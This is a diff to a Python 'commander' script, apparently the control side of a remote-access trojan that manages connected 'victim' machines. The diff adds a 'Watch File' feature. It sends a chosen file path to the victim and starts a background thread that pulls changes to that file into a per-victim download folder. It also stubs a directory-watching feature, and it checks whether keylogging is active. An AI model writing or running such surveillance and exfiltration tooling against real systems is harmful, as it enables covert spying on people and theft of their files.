@@ -1,5 +1,7 @@
 import os
 import select
+import threading
+
 from commander_utils import *
 
 if __name__ == '__main__':
@@ -20,6 +22,10 @@ if __name__ == '__main__':
     print_config(destination_ip, destination_port, (source_ip, source_port))
     victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
                                               destination_port)
+
+    # Initialize a Global Thread and Queue (for multipurpose)
+    global_thread = None
+    signal_queue = queue.Queue()
 
     # Display Menu
     display_menu()
@@ -58,6 +64,70 @@ if __name__ == '__main__':
                 # MENU ITEM 5 - Disconnect from victim
                 if command == constants.PERFORM_MENU_ITEM_FIVE:
                     disconnect_from_client(sockets_to_read, connected_clients)
+
+                # MENU ITEM 9 - Watch File
+                if command == constants.PERFORM_MENU_ITEM_NINE:
+                    print(constants.START_WATCH_FILE_MSG)
+
+                    # CASE 1: Check if client list is empty
+                    if len(connected_clients) == constants.ZERO:
+                        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
+
+                    # CASE 2: Handle single client in client list
+                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
+                        client_socket, (client_ip, client_port, status, is_watching) = next(
+                            iter(connected_clients.items()))
+
+                        # Check if currently keylogging
+                        if is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+                            pass
+
+                        else:
+                            # Send the notification to the victim that commander wants to watch a file
+                            client_socket.send(constants.WATCH_FILE_SIGNAL.encode())
+
+                            # Prompt user input + send file path to victim
+                            filename = input("[+] Enter the path of the file to watch: ")
+                            client_socket.send(filename.encode())
+
+                            # Get Response
+                            res = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
+
+                            # Logic
+                            if res[0] == constants.STATUS_TRUE:
+                                print(constants.CLIENT_RESPONSE.format(res[1]))
+                                print("[+] Now watching file {} from client ({}, {})...".format(filename,
+                                                                                                client_ip,
+                                                                                                client_port))
+
+                                # Create downloads/victim_ip directory (if necessary)
+                                sub_directory_path = make_main_and_sub_directories(client_ip)
+
+                                # a) Update state of socket to is_watching_file
+                                connected_clients[client_socket] = (client_ip, client_port, status, True)
+
+                                # b) Create + Start a thread to monitor client socket and handle modify/deleted files
+                                if global_thread is None:
+                                    global_thread = threading.Thread(target=watch_file_client_socket,
+                                                                     args=(client_socket,
+                                                                           signal_queue,
+                                                                           filename,
+                                                                           sub_directory_path,))
+                                    global_thread.daemon = True
+                                    global_thread.start()
+                            else:
+                                print(constants.CLIENT_RESPONSE.format(res[1]))
+                                pass
+
+                            # Print closing statements
+                            print(constants.RETURN_MAIN_MENU_MSG)
+                            print(constants.MENU_CLOSING_BANNER)
+
+                # MENU ITEM 10 - Watch Directory
+                # 1) If the file is ADDED (in directories), store it in the
+                #    ip-based directory of commander
 
                 # MENU ITEM 12 - Connect to a specific victim
                 if command == constants.PERFORM_MENU_ITEM_TWELVE:
